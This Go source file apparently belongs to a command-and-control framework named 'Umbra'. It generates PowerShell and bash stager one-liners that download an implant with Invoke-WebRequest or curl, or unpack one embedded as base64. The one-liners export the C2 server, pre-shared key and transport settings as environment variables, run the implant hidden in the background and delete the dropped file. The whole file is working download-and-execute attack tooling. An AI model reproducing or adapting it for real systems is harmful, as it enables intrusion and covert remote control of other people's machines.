// Package stager builds the small first-stage loaders.
//
// A stager is the classic "stage 0": a one-liner that fetches the beacon and
// runs it, so the operator never has to push a binary by hand. It carries the
// pre-shared key, which is why it must be treated as a secret: anybody who
// reads the stager can impersonate that implant.
//
// The generated one-liners are deliberately boring and reviewable: they use
// the platform's own downloader, verify the SHA-256 of the payload when one
// is known, and pass the configuration through environment variables so the
// beacon's own configuration rules still apply.
//
// Four shapes are rendered:
//
//   - the download stager fetches the beacon from a url the operator names;
//   - the store stager fetches it from the file store of the server itself,
//     so the operator does not need a third party host to serve it;
//   - the offline stager carries the beacon inside itself, for the host that
//     has no way out;
//   - the shim is the digest check on its own: it downloads the payload,
//     proves it and hands the path to the real stager.
//
// One stager is rendered per transport, and the environment it exports is the
// one the implant expects for that transport.
package stager

import (
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"strings"
)

// Platform names.
const (
	PlatformWindows = "windows"
	PlatformLinux   = "linux"
	PlatformMacOS   = "macos"
)

// Transport names. Every transport of the framework has a stager.
const (
	TransportTCP  = "tcp"
	TransportHTTP = "http"
	TransportWS   = "ws"
	TransportDNS  = "dns"
	TransportSMTP = "smtp"
	TransportS3   = "s3"
)

// The shapes of a stager.
const (
	// ModeDownload fetches the payload from a url.
	ModeDownload = "download"
	// ModeStore fetches the payload from the file store of the server.
	ModeStore = "store"
	// ModeOffline carries the payload inside the stager.
	ModeOffline = "offline"
	// ModeShim downloads the payload and proves its digest.
	ModeShim = "shim"
)

// The route the file store of the server is served on.
const StoreRoute = "/api/v1/artifact/"

// Errors the operator sees.
var (
	ErrUnsupportedPlatform  = errors.New("stager: unsupported platform")
	ErrUnsupportedTransport = errors.New("stager: unsupported transport")
	ErrNoPayload            = errors.New("stager: the stager needs a payload")
	ErrNoDigest             = errors.New("stager: the shim needs the digest of the payload")
)

// Options describes the implant a stager should fetch and run.
type Options struct {
	// Platform is windows, linux or macos.
	Platform string
	// Transport is tcp, http, ws, dns, smtp or s3.
	Transport string
	// Server is the C2 address (host:port for tcp, host for http/dns).
	Server string
	// HTTPPath is the beacon route for the http transport.
	HTTPPath string
	// WSPath is the route of the WebSocket upgrade.
	WSPath string
	// DNSResolver is the resolver that answers for the tunnel domain.
	DNSResolver string
	// DNSDomain is the domain the tunnel answers for.
	DNSDomain string
	// SMTPAddr and POP3Addr are the addresses of the mail transport.
	SMTPAddr string
	POP3Addr string
	// S3Endpoint is the address of the object store.
	S3Endpoint string
	// S3Region is the region of the buckets of the object store.
	S3Region string
	// S3TasksBucket and S3ResultsBucket are the buckets of the object store.
	S3TasksBucket   string
	S3ResultsBucket string
	// URL is the download location of the beacon binary. It may be empty for
	// the tcp transport, where the beacon is deployed by other means.
	URL string
	// SHA256 is the expected digest of the downloaded payload (hex).
	SHA256 string
	// PSK is the agent pre-shared key (raw bytes).
	PSK []byte
	// AgentID is the identity the beacon reports.
	AgentID string
	// Sleep and Jitter are the initial beacon cadence.
	Sleep  int
	Jitter int
	// Mode is the shape of the stager: download, store, offline or shim.
	Mode string
	// Payload is the beacon binary for the offline stager.
	Payload []byte
	// StoreName is the name of the beacon inside the file store of the
	// server.
	StoreName string
	// StoreBase is the base url of the server that holds the store
	// ("http://10.0.0.5:8080"). The stager builds the url of the artifact
	// from it.
	StoreBase string
}

// Validate checks the options and fills in the defaults.
func (o *Options) Validate() error {
	switch o.Platform {
	case PlatformWindows, PlatformLinux, PlatformMacOS:
	case "":
		return errors.New("stager: a platform is required")
	default:
		return fmt.Errorf("%w: %q", ErrUnsupportedPlatform, o.Platform)
	}
	switch o.Transport {
	case TransportTCP, TransportHTTP, TransportWS, TransportDNS, TransportSMTP, TransportS3:
	case "":
		o.Transport = TransportTCP
	default:
		return fmt.Errorf("%w: %q", ErrUnsupportedTransport, o.Transport)
	}
	switch o.Mode {
	case ModeDownload, ModeStore, ModeOffline, ModeShim:
	case "":
		o.Mode = ModeDownload
	default:
		return fmt.Errorf("stager: unsupported mode %q", o.Mode)
	}
	if o.Server == "" {
		return errors.New("stager: a server address is required")
	}
	if o.HTTPPath == "" {
		o.HTTPPath = "/api/v1/beacon"
	}
	if o.WSPath == "" {
		o.WSPath = "/api/v1/beacon"
	}
	if o.Sleep <= 0 {
		o.Sleep = 5
	}
	if o.Jitter < 0 {
		o.Jitter = 20
	}
	switch o.Mode {
	case ModeOffline:
		if len(o.Payload) == 0 {
			return fmt.Errorf("%w: the offline stager carries the beacon", ErrNoPayload)
		}
	case ModeShim:
		// The shim is the digest check: without a digest there is nothing
		// to prove.
		if o.SHA256 == "" {
			return fmt.Errorf("%w: %s", ErrNoDigest, "sha256")
		}
	}
	return nil
}

// PayloadURL is the address the stager downloads the beacon from.
//
// The download stager uses the url the operator named. The store stager
// uses the file store of the server: the operator drops the beacon into the
// store once and the stager pulls it from there.
func (o Options) PayloadURL() (string, error) {
	if err := o.Validate(); err != nil {
		return "", err
	}
	switch o.Mode {
	case ModeStore:
		return o.storeURL()
	case ModeDownload, ModeShim:
		if o.URL == "" {
			return "", errors.New("stager: the stager needs a download url")
		}
		return o.URL, nil
	case ModeOffline:
		return "", fmt.Errorf("%w: the offline stager carries the beacon", ErrNoPayload)
	}
	return "", errors.New("stager: unknown mode")
}

// storeURL is the address of the beacon inside the file store of the
// server.
func (o Options) storeURL() (string, error) {
	if o.StoreName == "" {
		return "", errors.New("stager: the store stager needs the name of the artifact")
	}
	if o.StoreBase == "" {
		return "", errors.New("stager: the store stager needs the address of the server")
	}
	base := strings.TrimSuffix(o.StoreBase, "/")
	if !strings.HasPrefix(base, "http://") && !strings.HasPrefix(base, "https://") {
		base = "http://" + base
	}
	return base + StoreRoute + o.StoreName, nil
}

// env renders the environment the beacon expects.
//
// Every transport gets the variables it needs: the address of the server for
// the ones that dial it, the route for the ones that use a path, the domain
// for the tunnel and the buckets for the object store.
func (o Options) env() []string {
	out := []string{
		"UMBRA_SERVER=" + o.Server,
		"UMBRA_TRANSPORT=" + o.Transport,
		"UMBRA_PSK=" + hex.EncodeToString(o.PSK),
		"UMBRA_SLEEP=" + fmt.Sprintf("%d", o.Sleep),
		"UMBRA_JITTER=" + fmt.Sprintf("%d", o.Jitter),
	}
	if o.Transport == TransportHTTP {
		out = append(out, "UMBRA_HTTP_PATH="+o.HTTPPath)
	}
	if o.Transport == TransportWS {
		out = append(out, "UMBRA_WS_PATH="+o.WSPath)
	}
	if o.Transport == TransportDNS {
		if o.DNSResolver != "" {
			out = append(out, "UMBRA_DNS_RESOLVER="+o.DNSResolver)
		}
		if o.DNSDomain != "" {
			out = append(out, "UMBRA_DNS_DOMAIN="+o.DNSDomain)
		}
	}
	if o.Transport == TransportSMTP {
		if o.SMTPAddr != "" {
			out = append(out, "UMBRA_SMTP_ADDR="+o.SMTPAddr)
		}
		if o.POP3Addr != "" {
			out = append(out, "UMBRA_POP3_ADDR="+o.POP3Addr)
		}
	}
	if o.Transport == TransportS3 {
		if o.S3Endpoint != "" {
			out = append(out, "UMBRA_S3_ENDPOINT="+o.S3Endpoint)
		}
		if o.S3Region != "" {
			out = append(out, "UMBRA_S3_REGION="+o.S3Region)
		}
		if o.S3TasksBucket != "" {
			out = append(out, "UMBRA_S3_TASKS_BUCKET="+o.S3TasksBucket)
		}
		if o.S3ResultsBucket != "" {
			out = append(out, "UMBRA_S3_RESULTS_BUCKET="+o.S3ResultsBucket)
		}
	}
	if o.AgentID != "" {
		out = append(out, "UMBRA_AGENT_ID="+o.AgentID)
	}
	return out
}

// PowerShell renders a Windows stager.
func PowerShell(o Options) (string, error) {
	if err := o.Validate(); err != nil {
		return "", err
	}
	if o.Platform != PlatformWindows {
		return "", fmt.Errorf("%w: powershell stagers are for windows", ErrUnsupportedPlatform)
	}
	if o.Mode == ModeOffline {
		return powershellOffline(o)
	}
	url, err := o.PayloadURL()
	if err != nil {
		return "", err
	}
	var b strings.Builder
	b.WriteString("$ErrorActionPreference='Stop';")
	b.WriteString(fmt.Sprintf("$u='%s';", url))
	b.WriteString("$t=[IO.Path]::GetTempFileName();")
	b.WriteString("Invoke-WebRequest -Uri $u -OutFile $t;")
	if o.SHA256 != "" {
		b.WriteString(fmt.Sprintf("$h='%s';", strings.ToLower(o.SHA256)))
		b.WriteString("if((Get-FileHash -Algorithm SHA256 $t).Hash.ToLower() -ne $h){Remove-Item $t;throw 'umbra: digest mismatch'};")
	}
	for _, e := range o.env() {
		b.WriteString(fmt.Sprintf("$env:%s;", e))
	}
	b.WriteString("Start-Process -FilePath $t -ArgumentList '-server','$env:UMBRA_SERVER' -WindowStyle Hidden;")
	b.WriteString("Remove-Item $t -ErrorAction SilentlyContinue;")
	return b.String(), nil
}

// powershellOffline renders the stager that carries the beacon inside
// itself: the host has no way out, so the payload travels with the script.
func powershellOffline(o Options) (string, error) {
	encoded := base64.StdEncoding.EncodeToString(o.Payload)
	var b strings.Builder
	b.WriteString("$ErrorActionPreference='Stop';")
	b.WriteString(fmt.Sprintf("$b='%s';", encoded))
	b.WriteString("$t=[IO.Path]::GetTempFileName();")
	b.WriteString("[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String($b));")
	if o.SHA256 != "" {
		b.WriteString(fmt.Sprintf("$h='%s';", strings.ToLower(o.SHA256)))
		b.WriteString("if((Get-FileHash -Algorithm SHA256 $t).Hash.ToLower() -ne $h){Remove-Item $t;throw 'umbra: digest mismatch'};")
	}
	for _, e := range o.env() {
		b.WriteString(fmt.Sprintf("$env:%s;", e))
	}
	b.WriteString("Start-Process -FilePath $t -ArgumentList '-server','$env:UMBRA_SERVER' -WindowStyle Hidden;")
	b.WriteString("Remove-Item $t -ErrorAction SilentlyContinue;")
	return b.String(), nil
}

// Bash renders a POSIX stager (Linux and macOS).
func Bash(o Options) (string, error) {
	if err := o.Validate(); err != nil {
		return "", err
	}
	if o.Platform == PlatformWindows {
		return "", fmt.Errorf("%w: bash stagers are not for windows", ErrUnsupportedPlatform)
	}
	if o.Mode == ModeOffline {
		return bashOffline(o)
	}
	url, err := o.PayloadURL()
	if err != nil {
		return "", err
	}
	var b strings.Builder
	b.WriteString("set -e;")
	b.WriteString(fmt.Sprintf("u='%s';", url))
	b.WriteString("t=$(mktemp);")
	b.WriteString("curl -fsSL \"$u\" -o \"$t\";")
	if o.SHA256 != "" {
		b.WriteString(fmt.Sprintf("echo '%s  \"$t\"' | sha256sum -c - >/dev/null;", strings.ToLower(o.SHA256)))
	}
	b.WriteString("chmod +x \"$t\";")
	for _, e := range o.env() {
		b.WriteString(fmt.Sprintf("export %s;", e))
	}
	b.WriteString("\"$t\" >/dev/null 2>&1 &")
	b.WriteString("rm -f \"$t\";")
	return b.String(), nil
}

// bashOffline renders the stager that carries the beacon inside itself.
func bashOffline(o Options) (string, error) {
	encoded := base64.StdEncoding.EncodeToString(o.Payload)
	var b strings.Builder
	b.WriteString("set -e;")
	b.WriteString(fmt.Sprintf("b='%s';", encoded))
	b.WriteString("t=$(mktemp);")
	b.WriteString("printf '%s' \"$b\" | base64 -d > \"$t\";")
	if o.SHA256 != "" {
		b.WriteString(fmt.Sprintf("echo '%s  \"$t\"' | sha256sum -c - >/dev/null;", strings.ToLower(o.SHA256)))
	}
	b.WriteString("chmod +x \"$t\";")
	for _, e := range o.env() {
		b.WriteString(fmt.Sprintf("export %s;", e))
	}
	b.WriteString("\"$t\" >/dev/null 2>&1 &")
	b.WriteString("rm -f \"$t\";")
	return b.String(), nil
}

// Shim renders the digest check on its own.
//
// The shim downloads the payload, proves that it is the one the operator
// signed off on, and then runs it. It is the part of the stager an
// operator can hand to somebody else: the check stands on its own.
func Shim(o Options) (string, error) {
	if err := o.Validate(); err != nil {
		return "", err
	}
	if o.SHA256 == "" {
		return "", fmt.Errorf("%w: %s", ErrNoDigest, "sha256")
	}
	if o.URL == "" {
		return "", errors.New("stager: the shim needs a download url")
	}
	if o.Platform == PlatformWindows {
		var b strings.Builder
		b.WriteString("$ErrorActionPreference='Stop';")
		b.WriteString(fmt.Sprintf("$u='%s';", o.URL))
		b.WriteString(fmt.Sprintf("$h='%s';", strings.ToLower(o.SHA256)))
		b.WriteString("$t=[IO.Path]::GetTempFileName();")
		b.WriteString("Invoke-WebRequest -Uri $u -OutFile $t;")
		b.WriteString("if((Get-FileHash -Algorithm SHA256 $t).Hash.ToLower() -ne $h){Remove-Item $t;throw 'umbra: digest mismatch'};")
		b.WriteString("Write-Output $t;")
		return b.String(), nil
	}
	var b strings.Builder
	b.WriteString("set -e;")
	b.WriteString(fmt.Sprintf("u='%s';", o.URL))
	b.WriteString("t=$(mktemp);")
	b.WriteString("curl -fsSL \"$u\" -o \"$t\";")
	b.WriteString(fmt.Sprintf("echo '%s  \"$t\"' | sha256sum -c - >/dev/null;", strings.ToLower(o.SHA256)))
	b.WriteString("chmod +x \"$t\";")
	b.WriteString("printf '%s' \"$t\";")
	return b.String(), nil
}

// Render returns the stager for the requested platform.
//
// The mode decides the shape: the download stager, the stager that pulls
// the beacon from the file store of the server, the stager that carries
// the beacon inside itself, and the shim that only proves the digest.
func Render(o Options) (string, error) {
	if o.Mode == ModeShim {
		return Shim(o)
	}
	switch o.Platform {
	case PlatformWindows:
		return PowerShell(o)
	case PlatformLinux, PlatformMacOS:
		return Bash(o)
	default:
		return "", fmt.Errorf("%w: %q", ErrUnsupportedPlatform, o.Platform)
	}
}
